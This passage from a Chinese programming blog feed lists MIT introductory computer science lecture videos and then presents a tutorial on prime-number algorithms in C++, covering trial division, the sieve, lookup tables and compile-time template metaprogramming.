<p></p></a><a title="9: Binary Search, Bubble and Selection Sorts" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-9"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">9: Binary Search, Bubble and Selection Sorts</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-9">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p8.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="10: Divide and Conquer Methods, Merge Sort, Exceptions" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-10"> 
<p></p></a><a title="10: Divide and Conquer Methods, Merge Sort, Exceptions" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-10"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">10: Divide and Conquer Methods, Merge Sort, Exceptions</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-10">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p9.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="11: Testing and Debugging" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-11"> 
<p></p></a><a title="11: Testing and Debugging" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-11"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">11: Testing and Debugging</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-11">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p10.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="12: Debugging, Knapsack Problem, Introduction to Dynamic Programming" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-12"> 
<p></p></a><a title="12: Debugging, Knapsack Problem, Introduction to Dynamic Programming" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-12"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">12: Debugging, Knapsack Problem, Introduction to Dynamic Programming</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-12">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p11.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="13: Dynamic Programming: Overlapping Subproblems, Optimal Substructure" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-13"> 
<p></p></a><a title="13: Dynamic Programming: Overlapping Subproblems, Optimal Substructure" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-13"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">13: Dynamic Programming: Overlapping Subproblems, Optimal Substructure</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-13">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p12.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="14: Introduction to Object-oriented Programming" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-14"> 
<p></p></a><a title="14: Introduction to Object-oriented Programming" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-14"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">14: Introduction to Object-oriented Programming</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-14">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p13.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="15: Abstract Data Types, Classes and Methods" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-15"> 
<p></p></a><a title="15: Abstract Data Types, Classes and Methods" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-15"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">15: Abstract Data Types, Classes and Methods</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-15">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p14.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="16: Encapsulation, Inheritance, Shadowing" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-16"> 
<p></p></a><a title="16: Encapsulation, Inheritance, Shadowing" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-16"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">16: Encapsulation, Inheritance, Shadowing</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-16">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p15.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="17: Computational Models: Random Walk Simulation" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-17"> 
<p></p></a><a title="17: Computational Models: Random Walk Simulation" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-17"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">17: Computational Models: Random Walk Simulation</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-17">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p16.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="18: Presenting Simulation Results, Pylab, Plotting" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-18"> 
<p></p></a><a title="18: Presenting Simulation Results, Pylab, Plotting" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-18"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">18: Presenting Simulation Results, Pylab, Plotting</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-18">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p17.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="19: Biased Random Walks, Distributions" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-19"> 
<p></p></a><a title="19: Biased Random Walks, Distributions" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-19"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">19: Biased Random Walks, Distributions</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-19">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p18.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="20: Monte Carlo Simulations, Estimating pi" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-20"> 
<p></p></a><a title="20: Monte Carlo Simulations, Estimating pi" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-20"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">20: Monte Carlo Simulations, Estimating pi</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-20">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p19.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="21: Validating Simulation Results, Curve Fitting, Linear Regression" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-21"> 
<p></p></a><a title="21: Validating Simulation Results, Curve Fitting, Linear Regression" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-21"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">21: Validating Simulation Results, Curve Fitting, Linear Regression</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-21">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p20.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="22: Normal, Uniform, and Exponential Distributions" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-22"> 
<p></p></a><a title="22: Normal, Uniform, and Exponential Distributions" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-22"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">22: Normal, Uniform, and Exponential Distributions</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-22">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p21.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="23: Stock Market Simulation" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-23"> 
<p></p></a><a title="23: Stock Market Simulation" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-23"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">23: Stock Market Simulation</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-23">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p22.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="24: Course Overview; What Do Computer Scientists Do?" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-24"> 
<p></p></a><a title="24: Course Overview; What Do Computer Scientists Do?" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-24"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">24: Course Overview; What Do Computer Scientists Do?</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-24">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p23.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/4657.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4657.html" class="wp_rp_title">狗日的开源软件许可证</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2474.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2474.html" class="wp_rp_title">（麻省理工免费课程）C语言内存管理和C++面向对象编程</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19612.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_title">50年前的登月程序和程序员有多硬核</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17929.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17929.html" class="wp_rp_title">Go编程模式：修饰器</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17757.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17757.html" class="wp_rp_title">如何重构“箭头型”代码</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3723" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="8529de10e7">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>14</strong> 人打了分，平均分： <strong>3.86</strong> )<br><span class="post-ratings-text" id="ratings_3723_text"></span><meta itemprop="name" content="（麻省理工免费课程）计算机科学和编程导论">
<meta itemprop="headline" content="（麻省理工免费课程）计算机科学和编程导论">
<meta itemprop="description" content="以前本站推荐过麻省理工的C/C++的课程，今天在他们的网站看到上有一组关于计算机科学和编程导论的免费公开课（视频是Youtube的），我看了几个课程，我觉得讲得很系统啊，而且有一点一通百通的感觉。虽然是理论课，但是可以感到我国的教育还是有很大差距的。这个组课程推荐给大家（需要翻墙），视频都有字幕，计算机科学系毕业的同学应该会很容易听懂。强烈推荐。（网友Aslan指出已经有人搬运到优酷上了，链接在这...">
<meta itemprop="datePublished" content="2011-02-28T08:25:07+08:00">
<meta itemprop="dateModified" content="2011-12-12T22:33:27+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3723.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3723.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.86">
<meta itemprop="ratingCount" content="14">
</div>
</div>
<div id="post-ratings-3723-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-02-28T08:25:07+08:00</pubDate>
<guid>https://coolshell.cn/articles/3723.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 打印质数的各种算法 ]]></title>
<link>https://coolshell.cn/articles/3738.html</link>
<content><![CDATA[ 
<p>打印质数的算法应该是学习计算机编程的一个经典的问题，在这里想给大家展示一些方法，相信这些方法会对你的编程有一定的启发作用。请你注意几点，</p>
<ul>
<li>实际应用和教学应用有很大的差别。</li>
<li>最后的那个使用编译时而不是运行时的方法大家可以重点看看。</li>
</ul>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E6%95%99%E7%A7%91%E4%B9%A6%E7%9A%84%E7%A4%BA%E4%BE%8B" title="教科书的示例">教科书的示例</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E8%BE%83%E5%A5%BD%E7%9A%84%E7%AE%97%E6%B3%95" title="较好的算法">较好的算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8%E7%9A%84%E7%AE%97%E6%B3%95" title="实际应用的算法">实际应用的算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E4%BD%BF%E7%94%A8%E7%BC%96%E8%AF%91%E6%97%B6%E8%80%8C%E4%B8%8D%E6%98%AF%E8%BF%90%E8%A1%8C%E6%97%B6" title="使用编译时而不是运行时">使用编译时而不是运行时</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E6%95%99%E7%A7%91%E4%B9%A6%E7%9A%84%E7%A4%BA%E4%BE%8B"></span>教科书的示例<span class="ez-toc-section-end"></span>
</h4>
<p>首先，先给一个教科书的示例。下面这个示例应该是教科书（至少是我上大学时的教科学）中算法复杂度最好的例子了。其想法很简单，先写一个判断是否是质数的函数isPrime()，然后从1到n分别调用isPrime()函数来检查。检查是否是质数的算法是核心，其简单的使用从2到n的开根的数作为除数。这样的算法复杂度几乎是O(n*log(n))，看上去不错，但其实很不经济。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;iostream&gt;
using namespace std;

bool isPrime(int nr)
{
    for (int d = 2; (d * d) &lt; (nr + 1); ++d){
        if (!(nr % d)){
            return false;
        }
     }
    return true;
}

int main (int argc, char * const argv[])
{
    for (int i = 0; i &lt; 50; ++i){
        if (isPrime(i)){
            cout &lt;&lt; i &lt;&lt; endl;
        }
    }
}
</pre>
<h4>
<span id="more-3738"></span>较好的算法</h4>
<p>我们知道，我们的算法如果写成线性算法，也就是O(n)，已经算是不错了，但是最好的是O(Log(n))的算法，这是一个对数级的算法，著名的二分取中（Binary Search）正是O(Log(n))的算法。<strong>通常来说，O(Log(n))的算法都是以排除法做为手段的</strong>。所以，找质数的算法完全可以采用排除法的方式。如下所示，这种算法的复杂度是<em>O</em><em>(n(log(logn)))。</em></p>
<p><strong>示例：打印30以内的质数</strong></p>
<p>一、初始化如下列表。</p>
<pre> 2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30</pre>
<p>二、把第一个数（2）取出来，去掉所有可以被2整除的数。</p>
<pre> 2  3     5     7     9    11    13    15    17    19    21    23    25    27    29</pre>
<p>三、取第二个数（3），去掉所有可以被 3整除的数。</p>
<pre> 2  3     5     7          11    13          17    19          23    25          29</pre>
<p>四、取第三个数（5），因为4已经被去除了，再去掉所有可以被5整除的数。</p>
<pre> 2  3     5     7          11    13          17    19          23                29</pre>
<p>接下来的数是7，但是7的平方是49，其大于了30，所以我们可以停止计算了。剩下的数就是所有的质数了。</p>
<h4>
<span class="ez-toc-section" id="%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8%E7%9A%84%E7%AE%97%E6%B3%95"></span>实际应用的算法<span class="ez-toc-section-end"></span>
</h4>
<p>实际应用中，我们通常不会使用上述的两种算法，因为那是理论学院派的算法。实际中的算法是，我把质数事先就计算好，放在一个文件中，然后在程序启动时（注意是在启动时读这个文件，而不是运行时每调用一次就读一次文件），读取这个文件，然后打印出来就可以了。如果需要查找的化，二分查找或是hash表查找将会获得巨大的性能提升。当然，这样的方法对于空间来说比前面两个都要消耗得大，但是你可以有O(log(n))或是O(1)的时间复杂度。</p>
<p>所以，我想在这里提醒大家——<strong>实际和理论的的方法很不一样的</strong>，千万不要读书读成书呆子。在游戏编程的世界里，大量的数据都不是运行计算的，而都是写在文件中的。比如，一个火焰效果，一个人物跑动的动作，都是事先写在文件中的。</p>
<h4>
<span class="ez-toc-section" id="%E4%BD%BF%E7%94%A8%E7%BC%96%E8%AF%91%E6%97%B6%E8%80%8C%E4%B8%8D%E6%98%AF%E8%BF%90%E8%A1%8C%E6%97%B6"></span>使用编译时而不是运行时<span class="ez-toc-section-end"></span>
</h4>
<p>下面这个例子（本例参考于<a href="http://www.intermediaware.com/blog/846/hack-of-the-day-fast-prime-numbers" target="_blank">这里</a>）你需要注意了，这是一个高级用法，使用模式来在编译时计算质数，而不是运行时。这种技术使用了C++编译器对模板的特化时的处理来生成自己相要的结果。这种方法在技术上是相当Cool的，但并不一定实用，这里只是想像大家展示这种用法。这是C++的最骨灰级的用法了。</p>
<p>请看下面的两个模板类，第一个模板以递归的方式检查是否是质数，第二个方法是递归的退出条件（当N=1时），对于模板的重载，请参看相关的C++书籍。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">template&lt;int N, int D = N - 1&gt;
struct isPrime {
    enum {
        result = (N % D) &amp;&amp; isPrime&lt;N, D-1&gt;::result
    };
};

template&lt;int N&gt;
struct isPrime&lt;N, 1&gt; {
    enum {
        result = true
    };
};
</pre>
<p>于是，通过这个模板，我们可以使用下面的代码来检查是否是质数：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">if (isPrime&lt;3&gt;::result)
    cout &lt;&lt; "Guess what: 3 is a prime!";
</pre>
<p>下一步，我们需要打出一个区间内的质数，所以，我们需要继续设计我们的print模板。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">template&lt;int N, bool ISPRIME&gt;
struct printIfPrime {
    static inline void print() {}
};

template &lt;int N&gt;
struct printIfPrime&lt;N, true&gt; {
    static inline void print() {
        std::cout &lt;&lt; N &lt;&lt; endl;
    }
};
</pre>
<p>从上面的代码中，我们可以看到，我们的第一个实际是什么也没做，而第二个有输出，注意第二个的模板参数中有一个true，其意味着那个质数的判断。于是我们就可以给出下面的代码来尝试着打印出一段区间内的质数：（<strong>请不要编译！！</strong>因为那会让编译器进入无限循环中，原因是printPrimes会不停地调用自己永不停止）</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">template&lt;int N, int MAX&gt;
struct printPrimes {
    static inline void print()
    {
        printIfPrime&lt;N, isPrime&lt;N&gt;::result&gt;::print();
        printPrimes&lt;N + 1, MAX&gt;::print();
    }
};
</pre>
<p>为了避免这个问题，你需要再加一个模板类，如下所示。这样当N变成MAX的时候，递归就结束了。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">template&lt;int N&gt;
struct printPrimes&lt;N, N&gt; {
    static inline void print() {
        printIfPrime&lt;N, isPrime&lt;N&gt;::result&gt;::print();
    }
};
</pre>
<p>最后，让我们来看看最终的调用：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int main (int argc, char * const argv[])
{
    printPrimes&lt;2, 40&gt;::print();
    return 0;
}
</pre>
<p>这个方法很NB，但是有两个问题：</p>
<ul>
<li>比较耗编译时间。</li>
<li>不能在运行时输入MAX的值。</li>
</ul>
<p>不过，相信这种玩法会启动你很多的编程思路。</p>
<p>当然，还有以前说过的那个——《<span style="font-weight: bold;"><a title="检查素数的正则表达式" rel="bookmark" href="https://coolshell.cn/articles/2704.html" target="_blank">检查素数的正则表达式</a></span>》</p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/7965.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7965.html" class="wp_rp_title">一个fork的面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1857.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1857.html" class="wp_rp_title">C 语言整型谜题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6010.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6010.html" class="wp_rp_title">一些有意思的算法代码</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3961.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3961.html" class="wp_rp_title">“火柴棍式”程序员面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11847.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11847.html" class="wp_rp_title">谜题的答案和活动的心得体会</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3738" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="4c3287db87">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>12</strong> 人打了分，平均分： <strong>3.50</strong> )<br><span class="post-ratings-text" id="ratings_3738_text"></span><meta itemprop="name" content="打印质数的各种算法">
<meta itemprop="headline" content="打印质数的各种算法">
<meta itemprop="description" content="打印质数的算法应该是学习计算机编程的一个经典的问题，在这里想给大家展示一些方法，相信这些方法会对你的编程有一定的启发作用。请你注意几点，

	实际应用和教学应用有很大的差别。
	最后的那个使用编译时而不是运行时的方法大家可以重点看看。

教科书的示例
首先，先给一个教科书的示例。下面这个示例应该是教科书（至少是我上大学时的教科学）中算法复杂度最好的例子了。其想法很简单，先写一个判断是否...">
<meta itemprop="datePublished" content="2011-02-28T09:14:10+08:00">
<meta itemprop="dateModified" content="2011-04-11T08:03:05+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3738.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3738.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
